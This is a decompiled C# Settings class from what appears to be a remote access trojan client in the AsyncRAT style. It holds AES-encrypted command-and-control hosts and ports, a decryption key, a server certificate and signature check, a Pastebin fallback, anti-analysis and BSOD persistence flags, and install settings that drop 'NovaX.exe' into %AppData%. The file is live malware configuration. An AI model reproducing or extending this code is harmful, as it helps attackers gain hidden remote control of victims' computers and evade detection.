using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Client.Algorithm;
using Client.Helper;

namespace Client
{
	// Token: 0x02000003 RID: 3
	public static class Settings
	{
		// Token: 0x06000003 RID: 3 RVA: 0x00002814 File Offset: 0x00000A14
		public static bool InitializeSettings()
		{
			bool result;
			try
			{
				Settings.Key = Encoding.UTF8.GetString(Convert.FromBase64String(Settings.Key));
				Settings.aes256 = new Aes256(Settings.Key);
				Settings.Por_ts = Settings.aes256.Decrypt(Settings.Por_ts);
				Settings.Hos_ts = Settings.aes256.Decrypt(Settings.Hos_ts);
				Settings.Ver_sion = Settings.aes256.Decrypt(Settings.Ver_sion);
				Settings.In_stall = Settings.aes256.Decrypt(Settings.In_stall);
				Settings.MTX = Settings.aes256.Decrypt(Settings.MTX);
				Settings.Paste_bin = Settings.aes256.Decrypt(Settings.Paste_bin);
				Settings.An_ti = Settings.aes256.Decrypt(Settings.An_ti);
				Settings.Anti_Process = Settings.aes256.Decrypt(Settings.Anti_Process);
				Settings.BS_OD = Settings.aes256.Decrypt(Settings.BS_OD);
				Settings.Group = Settings.aes256.Decrypt(Settings.Group);
				Settings.Hw_id = HwidGen.HWID();
				Settings.Server_signa_ture = Settings.aes256.Decrypt(Settings.Server_signa_ture);
				Settings.Server_Certificate = new X509Certificate2(Convert.FromBase64String(Settings.aes256.Decrypt(Settings.Certifi_cate)));
				result = Settings.VerifyHash();
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002980 File Offset: 0x00000B80
		private static bool VerifyHash()
		{
			bool result;
			try
			{
				RSACryptoServiceProvider rsacryptoServiceProvider = (RSACryptoServiceProvider)Settings.Server_Certificate.PublicKey.Key;
				using (SHA256Managed sha256Managed = new SHA256Managed())
				{
					result = rsacryptoServiceProvider.VerifyHash(sha256Managed.ComputeHash(Encoding.UTF8.GetBytes(Settings.Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Settings.Server_signa_ture));
				}
			}
			catch (Exception)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x04000001 RID: 1
		public static string Por_ts = "rlCIMQYEr8ckks1jWhHOGbCNxhXi8kkiffbwiBdsyCi8i/TPgUeHi33DtXyfk4TGn0Gt5ulqwjNAcAEGIHll5w==";

		// Token: 0x04000002 RID: 2
		public static string Hos_ts = "Tcb0mlsxlFKhhuTMdx7WXx7sP5pgMLpAwIWh529iZprfTCPSaqWtecugc2GVZIevhxSR8E2WVvQAnUeY9IIPpA==";

		// Token: 0x04000003 RID: 3
		public static string Ver_sion = "Z49N+DvhSc0UXsWfc2+dSGsbONPv4KHwt63wVFlKhRF+U+KzIJ1yCRptfuzRu+KEtiLWcm98es5p2sard6clJw==";

		// Token: 0x04000004 RID: 4
		public static string In_stall = "tRLDxwa1eucYv0OyTBYyvn+VJRUmINygaRCVl2e1PsRwo8g4tBMe1fPBKTX7Imo9+Z1N0puBLtlXrycpBmnDJA==";

		// Token: 0x04000005 RID: 5
		public static string Install_Folder = "%AppData%";

		// Token: 0x04000006 RID: 6
		public static string Install_File = "NovaX.exe";

		// Token: 0x04000007 RID: 7
		public static string Key = "QmUxcmZMVUxZdXJGYVdqVm5ZT1Y4dVZPZ0toVXBlcmc=";

		// Token: 0x04000008 RID: 8
		public static string MTX = "hGg1ZLIqryUyOxS1PH2bgpgOHzzVmCI+YA9XCVJ/bCgIDbq37w21vz63VFYl1Y3wokQ3hiejWKmXD2HzEH4FPqcLQ9ARhcxecDYsg625GyQ=";

		// Token: 0x04000009 RID: 9
		public static string Certifi_cate = "SG5lu2Sl1FKCPEWvVPmtmNZcMOLNEBxyzf9obIm12fpZ+gq5IQWOhAiN6lHBTlsJx1rFu5su7I6QogFfZD/+O/ULH8jdHRVoP1JEMdQiYYJlsyCjCXArAuUOFFmNLira6RduS+8fWOFAwiYhabzHlaRhC2VeDBWxrlbhB4IjMNCTy6Wju4jau/IIdMdThS5UBMxlmyiQ3xP7x3waku/wiL5BSdDP8cPolabkYD0oQOGD3nshocsG4xPk/ae3zsv1tVCZIiOQvzmRxad9kqtSqNZ4MzQbtm4kJ6aAJT5RyOBTc5UvHpzELjGYmgMA3PQE8tOJY3NojQ5zvvDaV9dHqhZEaYXZ3xgFGKIbW9qlbhGP+UyMN+0gSFpKrZ8gvw5gKXS+Z3pfRnU9iLCeFXDon9OEkVlUFx9TAhAtTVV1gcgPd0aogIE9HOsE/oBI4A/y5SeICeF0zJafqY6882fz2/MLQ/unCauOKbsPAbgdsEDMVfLBcbBf27YmZvgQ/bjQe+O5CRK1A6A/5Qs3YrkE0le3AVwv1JNJrfdIDxHCvL6HowkBlysbWXO/Dq5QNsCg7XSBc7cANVYrw7KCwExvu29g23NwewU8ubbAkH+KSsJbC/9kCAeLw7zDs5fBQjfPzMJJf1jB1MIch9QwABrvXXs1PLikaBa8buKk88sZiUGNMkVocDpPWRdEKhc8CkRAkZ0tXZ2Z4B3LYac6afVjXi1/C89NVBQyKv06kDx+ih7QB6tu3mahjZc5ZgkvgLVbasFOgtBpxxwbLI6gl0HB7zUqd/NqBGAM3rq2NNHigcyDpYMjQVlCQXzJP+b7KnqQU045PiMyfk0KbaC/wPmhGYTYA4QnaZ+NU1JuoeNuK/8J6UyO7P9zDCyPXzc7MZ/EOk7iN2PTw5YvrekVhtqVxlSqqwP8lB4ysEbbnaiFFxObx3FN3Srki7dvjTCMT4UgWTz2uvwDoVeLpqcZ/X3cf2UBhfCjHks8PHewf6oMseA4HVsff1c43TKPpwPeoJGhJ1RorAEjTUugcCwniu9tH8q84x9UvOLhjODMbSYomgoz5bXvz+FhJW8GMx0J9Fw6";

		// Token: 0x0400000A RID: 10
		public static string Server_signa_ture = "aiox+rfPU0Q0II9uuRmp9q5KC9hpzXq/8TYqPu33TpjJajRGeGUO/AzjeYP6dTk6KOUBRYxJTAP405DHQn+fevFcZD77qBReOqiZj2I5PaH1LotiPH+X4gjBkL/l+5yXQwjygi4qE9U6rGZWcrLfQuWZ3U7qcZtsunObUi0UtZorbXWGxY30E3aDFQNEVOk8YVg4Jwye6iMgwcS4ZUP4sPC2e+QKp+56eVj6hPNWVS4oPX0jWrsUqn7uWrP83aCHfx1fl4eVDguhnnKIRDTku5H1DrecO2dymR1eHNaeuAM=";

		// Token: 0x0400000B RID: 11
		public static X509Certificate2 Server_Certificate;

		// Token: 0x0400000C RID: 12
		public static Aes256 aes256;

		// Token: 0x0400000D RID: 13
		public static string Paste_bin = "5pOY/2yjhu0br90BrbIb21xWEImEBVdp2MP/lRsV6rP+rrVZgNwTMYaAlnCQfIrmU3El2+PDvtUhLWIwfgFzHA==";

		// Token: 0x0400000E RID: 14
		public static string BS_OD = "p4laajeTiKrqcxs3SqjdpdT6yH3914Vn4pOT0No9dZtQmIp10drlkLDdiNyJUoaVYGBsLUKi5D2fZG3R/7/fDg==";

		// Token: 0x0400000F RID: 15
		public static string Hw_id = null;

		// Token: 0x04000010 RID: 16
		public static string De_lay = "1";

		// Token: 0x04000011 RID: 17
		public static string Group = "ZEOV1rpvzmyzg9DZpy13Zq3BzWRBZPdzuWiKJVvnRQZ6XiHv0NiNGOr5Nu/SL+4WjgJZWIMEW+i5QmdCOZHr7A==";

		// Token: 0x04000012 RID: 18
		public static string Anti_Process = "vR6w1YzwOsrxHwqfnyx4fmYW4dRNzOle6K0Dxtza/inQNgRNPAcqkcWDjDLnPoKMIxAHgMRNCv/5M0rcYdzFxQ==";

		// Token: 0x04000013 RID: 19
		public static string An_ti = "fWV4e5aOk+WzWjdCqg5NfAEBuaX/SqhqjpcqotgxuXwXSOUHEr06rtAP5DqTVlOAlJAdpA+9Zot53FsRi3Sviw==";
	}
}
